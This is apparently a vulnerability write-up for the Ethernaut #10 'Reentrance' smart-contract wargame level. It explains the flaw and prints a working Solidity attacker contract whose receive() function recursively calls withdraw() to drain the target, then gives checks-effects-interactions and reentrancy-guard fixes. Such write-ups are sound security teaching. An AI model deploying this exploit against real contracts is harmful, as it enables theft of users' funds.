# 🎯 Vulnerability Report: Reentrance (Ethernaut #10)

## 🔓 Vulnerability  
- **Type**: Reentrancy Attack
- **Location**: `withdraw()` function in Reentrance contract
- **Root Cause**:  
  - State modification after external call
  - No reentrancy guard protection
  - Violation of Checks-Effects-Interactions pattern

## 🕵️‍♂️ How Did I Find It?  
1. **Code Review**:  
   - Identified dangerous pattern of external call before state update
   - Noticed `withdraw()` makes call before updating balance
   - Checked for absence of reentrancy protection modifiers

2. **Testing**:  
   - Created attacker contract with malicious fallback
   - Verified recursive calls are possible
   - Confirmed balance updates happen after transfers

## 💥 Exploit Steps
1. Deploy Attacker contract with target address
2. Deposit small amount (1 ETH) to appear legitimate
3. Call `withdraw()` to initiate attack
4. Fallback function recursively calls `withdraw()` 
5. Repeat until contract funds are drained

```js
// Attack Contract 
contract Attacker {
    Reentrance target;
    uint256 depositAmount = 1 ether;
    
    constructor(address _target) {
        target = Reentrance(_target);
    }
    
    function attack() external payable {
        target.donate{value: depositAmount}(address(this));
        target.withdraw(depositAmount);
    }
    
    receive() external payable {
        if(address(target).balance >= depositAmount) {
            target.withdraw(depositAmount);
        }
    }
}
```
## 🔐 Mitigation
- Use reentrancy guard modifier
- Use Checks-Effects-Interactions pattern
  ```js
  function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] -= _amount; // Effects first
    (bool success,) = msg.sender.call{value: _amount}(""); // Interaction last
    require(success);
  }
  ```
